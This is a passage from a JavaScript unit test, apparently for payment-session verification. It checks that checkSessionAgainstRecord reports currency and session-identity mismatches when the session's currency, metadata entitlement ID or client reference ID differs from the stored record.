    assert.equal(checkSessionAgainstRecord({ ...base, currency: 'eur' }, record).reason, 'currency-mismatch');
    assert.equal(
      checkSessionAgainstRecord({ ...base, metadata: { entitlementId: 'ent_y' } }, record).reason,
      'session-identity-mismatch',
    );
    assert.equal(
      checkSessionAgainstRecord({ ...base, client_reference_id: 'ent_y' }, record).reason,
      'session-identity-mismatch',
    );
  });
});
